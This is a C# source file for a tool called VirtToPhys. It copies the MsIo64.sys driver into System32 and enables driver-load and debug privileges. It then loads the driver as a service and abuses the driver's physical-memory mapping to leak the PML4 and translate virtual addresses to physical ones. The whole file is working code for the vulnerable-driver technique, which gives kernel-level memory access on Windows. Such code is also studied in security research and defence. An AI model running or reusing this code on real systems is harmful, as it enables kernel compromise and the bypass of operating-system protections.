using System;
using System.IO;
using System.Security.Principal;

namespace VirtToPhys
{
	class Wrapper
	{
		public static Boolean PreFlightChecks()
		{
			if (!WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid))
			{
				Console.WriteLine("[!] VirtToPhys must be run as Administrator");
				return false;
			}
			else
			{
				Console.WriteLine("[+] Running as Administrator");
			}

			if (IntPtr.Size != 8)
			{
				Console.WriteLine("[!] VirtToPhys only supports x64 execution on an x64 OS..");
				return false;
			}
			else
			{
				Console.WriteLine("[>] Executing on x64");
			}

			return true;
		}

		public static Boolean IsMsIoLoaded(String DriverServiceName = "MsIoTest")
		{
			return Handler.DirectoryObjectContainsDevice(DriverServiceName);
		}

		public static String WriteMsIo(String DriverFileName = "MsIo64.sys")
		{
			// Get drvpath
			String sDriver = AppDomain.CurrentDomain.BaseDirectory + DriverFileName;
			if (!File.Exists(sDriver))
			{
				Console.WriteLine("[!] MsIo64.sys not found..");
				return String.Empty;
			}

			// Generate filesystem path
			String Windir = Environment.GetEnvironmentVariable("windir");
			String DrvPath = Windir + @"\System32\" + DriverFileName;

			// Copy file
			try
			{
				File.Copy(sDriver, DrvPath);
			}
			catch
			{
				Console.WriteLine("[!] Failed to write MsIo64.sys..");
				return String.Empty;
			}

			return DrvPath;
		}

		public static Boolean LoadMsIo(String DriverServiceName = "MsIoTest")
		{
			Boolean bChecks = PreFlightChecks();
			if (!bChecks)
			{
				return false;
			}

			Console.WriteLine("[?] Loading MsIo driver..");

			if (IsMsIoLoaded())
			{
				Console.WriteLine("[+] MsIo driver already loaded, do you need coffee..?");
				return true;
			}

			Console.WriteLine("[*] Requesting privilege: SE_LOAD_DRIVER_PRIVILEGE");
			Boolean bCallRes = Handler.AssignTokenPrivilege(APIDef.SE_LOAD_DRIVER_PRIVILEGE);
			bCallRes = Handler.AssignTokenPrivilege(APIDef.SE_DEBUG_PRIVILEGE);
			if (bCallRes)
			{
				Console.WriteLine("    |-> Success");
			}
			else
			{
				return false;
			}

			String sDriverPath = WriteMsIo();
			if (sDriverPath == String.Empty)
			{
				return false;
			}

			bCallRes = Handler.LoadDriver(sDriverPath, DriverServiceName);
			if (bCallRes)
			{
				Console.WriteLine("[+] Driver load: OK");
				return true;
			}
			else
			{
				Console.WriteLine("[!] Driver load: FAIL");
				return false;
			}
		}

		public static Boolean UnLoadMsIo(String DriverServiceName = "MsIoTest")
		{
			Boolean bChecks = PreFlightChecks();
			if (!bChecks)
			{
				return false;
			}

			Console.WriteLine("[?] UnLoading MsIo driver..");

			if (!IsMsIoLoaded())
			{
				Console.WriteLine("[+] MsIo driver not loaded, do you need coffee..?");
				return true;
			}

			Console.WriteLine("[*] Requesting privilege: SE_LOAD_DRIVER_PRIVILEGE");
			Boolean bCallRes = Handler.AssignTokenPrivilege(APIDef.SE_DEBUG_PRIVILEGE);
			bCallRes = Handler.AssignTokenPrivilege(APIDef.SE_LOAD_DRIVER_PRIVILEGE);
			if (bCallRes)
			{
				Console.WriteLine("    |-> Success");
			}
			else
			{
				return false;
			}

			bCallRes = Handler.UnLoadDriver(DriverServiceName);
			if (bCallRes)
			{
				Console.WriteLine("[?] Driver unload: OK");
				return true;
			}
			else
			{
				Console.WriteLine("[!] Driver unload: FAIL");
				return false;
			}
		}

		public static void TranslateVirtToPhys(IntPtr VirtualAddress)
		{
			Boolean bChecks = PreFlightChecks();
			if (!bChecks)
			{
				return;
			}

			IntPtr hDriver = Handler.GetDriverHandle();
			if (hDriver == IntPtr.Zero)
			{
				return;
			}
			else
			{
				Console.WriteLine("[*] MsIO driver handle: " + hDriver);
			}

			// Leak PML4
			Console.WriteLine("[?] Leaking PML4..");
			APIDef.MSIO_PHYSICAL_MEMORY_INFO MemAlloc = Handler.MsIoAllocatePhysicalMemory(hDriver, IntPtr.Zero, 0x100000);
			if (MemAlloc.BaseAddess == IntPtr.Zero)
			{
				Console.WriteLine("[!] Failed to allocate physical memory..");
				Handler.FreeObjectHandle(hDriver);
				return;
			}

			IntPtr PML4 = Handler.Getx64LowStub(MemAlloc.BaseAddess);
			Handler.MsIoUnmapMemory(hDriver, MemAlloc);
			if (PML4 == IntPtr.Zero)
			{
				Console.WriteLine("[!] Failed to find PML4 value..");
				Handler.FreeObjectHandle(hDriver);
				return;
			}
			else
			{
				Console.WriteLine("[+] PML4 in lowstub --> " + string.Format("{0:X}", PML4.ToInt64()));
			}

			Console.WriteLine("[?] Converting VA -> PA");
			IntPtr pVAtoPhys = Handler.TranslateVirtualToPhysical(hDriver, PML4, VirtualAddress);
			if (pVAtoPhys == IntPtr.Zero)
			{
				Console.WriteLine("[!] Failed translate VA to physical address..");
				return;
			}
			else
			{
				Console.WriteLine("    |-> PhysAddress: " + string.Format("{0:X}", pVAtoPhys.ToInt64()));
			}
		}
	}
}
